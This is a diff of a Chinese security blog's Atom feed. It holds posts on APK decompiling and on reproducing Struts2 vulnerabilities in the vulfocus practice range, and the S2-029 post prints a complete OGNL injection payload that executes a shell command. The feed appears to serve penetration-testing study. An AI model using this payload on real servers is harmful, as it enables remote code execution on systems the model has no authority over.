@@ -3,11 +3,11 @@
   <title>Hzktester`s Blog</title>
   
   
-  <link href="https://ipvb.gitee.io/blog/atom.xml" rel="self"/>
+  <link href="https://ipvb.gitee.io/atom.xml" rel="self"/>
   
-  <link href="https://ipvb.gitee.io/blog/"/>
-  <updated>2020-09-18T11:41:04.722Z</updated>
-  <id>https://ipvb.gitee.io/blog/</id>
+  <link href="https://ipvb.gitee.io/"/>
+  <updated>2020-09-18T11:40:52.401Z</updated>
+  <id>https://ipvb.gitee.io/</id>
   
   <author>
     <name>hzktester</name>
@@ -17,33 +17,9 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>APP反编译-下载源码</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:04.722Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
-&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
-&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="https://ipvb.gitee.io/blog/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="https://ipvb.gitee.io/blog/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
     <title>APP之反编译+目录结构+重新打包+重新签名</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</id>
+    <link href="https://ipvb.gitee.io/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/"/>
+    <id>https://ipvb.gitee.io/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</id>
     <published>2020-08-16T07:31:00.000Z</published>
     <updated>2020-09-18T11:40:52.401Z</updated>
     
@@ -64,17 +40,41 @@
     
     
     
-    <category term="APP渗透" scheme="https://ipvb.gitee.io/blog/categories/APP%E6%B8%97%E9%80%8F/"/>
+    <category term="APP渗透" scheme="https://ipvb.gitee.io/categories/APP%E6%B8%97%E9%80%8F/"/>
     
     
-    <category term="APP反编译" scheme="https://ipvb.gitee.io/blog/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
+    <category term="APP反编译" scheme="https://ipvb.gitee.io/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>APP反编译-下载源码</title>
+    <link href="https://ipvb.gitee.io/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
+    <id>https://ipvb.gitee.io/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
+    <published>2020-08-16T07:31:00.000Z</published>
+    <updated>2020-09-18T11:41:04.722Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
+&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
+    
+    
+    
+    <category term="APP渗透" scheme="https://ipvb.gitee.io/categories/APP%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="APP反编译" scheme="https://ipvb.gitee.io/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
     
   </entry>
   
   <entry>
     <title>luac的解密过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-16T07:31:00.000Z</published>
     <updated>2020-09-18T11:40:48.056Z</updated>
     
@@ -90,38 +90,17 @@
     
     
     
-    <category term="APP渗透" scheme="https://ipvb.gitee.io/blog/categories/APP%E6%B8%97%E9%80%8F/"/>
+    <category term="APP渗透" scheme="https://ipvb.gitee.io/categories/APP%E6%B8%97%E9%80%8F/"/>
     
     
-    <category term="APP反编译" scheme="https://ipvb.gitee.io/blog/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-029 CVE-2016-0785复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:26.105Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    <category term="APP反编译" scheme="https://ipvb.gitee.io/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
     
   </entry>
   
   <entry>
     <title>S2-019 CVE-2013-4316复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:41:36.969Z</updated>
     
@@ -133,17 +112,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-046 CVE-2017-5638复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:34.705Z</updated>
     
@@ -155,17 +134,38 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-029 CVE-2016-0785复现过程</title>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-18T11:41:26.105Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-048 CVE-2017-9791复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:32.170Z</updated>
     
@@ -177,39 +177,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-052 CVE-2017-9805复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:42:30.256Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p></li><li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.1.2 - Struts 2.3.33&lt;br&gt;Struts 2.5 - Struts 2.5.12&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-053 CVE-2017-12611复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:28.158Z</updated>
     
@@ -221,39 +199,39 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
     
   </entry>
   
   <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <title>S2-052 CVE-2017-9805复现过程</title>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:42:24.035Z</updated>
+    <updated>2020-09-18T11:42:30.256Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p></li><li><p>poc利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 